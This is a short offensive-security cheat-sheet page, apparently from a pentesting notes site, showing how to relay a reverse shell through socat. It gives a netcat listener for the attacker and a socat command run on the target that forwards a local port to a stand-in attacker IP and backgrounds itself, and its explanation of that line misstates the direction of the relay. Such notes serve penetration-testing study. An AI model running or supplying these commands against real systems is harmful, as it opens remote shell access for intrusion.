# ⭕ Socat Reverse Shell Relay

### <mark style="color:orange;">**Reverse Shell Relay**</mark>

Using socat we can create a relay for us to send a reverse shell back to our own attacking machine.

```
#on attacker
sudo nc -lvnp 443

#on target
./socat tcp-l:8000 tcp:ATTACKING_IP:443 &
```

> **Line 2:** Start a netcat listener on port 443.
>
> **Line 5:** Using socat, relay port 443 to our local machine on port 8000.
>
> **&:** Backgrounds the application.

{% hint style="info" %}
Make sure to open the listening port first, then connect back to the attacking machine
{% endhint %}
